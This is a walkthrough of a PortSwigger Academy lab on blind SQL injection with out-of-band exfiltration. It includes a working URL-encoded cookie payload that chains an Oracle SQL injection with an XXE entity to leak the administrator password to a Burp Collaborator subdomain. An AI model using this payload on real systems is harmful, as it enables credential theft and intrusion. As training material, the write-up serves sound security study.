 This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

#### Note

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

I started by visiting the shop's front page and intercepting the request containing the `TrackingId` cookie using **Burp Suite Professional**.

I modified the cookie with a SQL injection combined with an **XXE payload** designed to extract the administrator's password through an out-of-band interaction with **Burp Collaborator**:

```text
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

I used **Insert Collaborator payload** to replace the placeholder with a unique Collaborator subdomain, then sent the modified request.

After waiting a few seconds, I opened the **Collaborator** tab and clicked **Poll now**. The application generated DNS and HTTP interactions, and the administrator's password appeared as part of the requested subdomain.

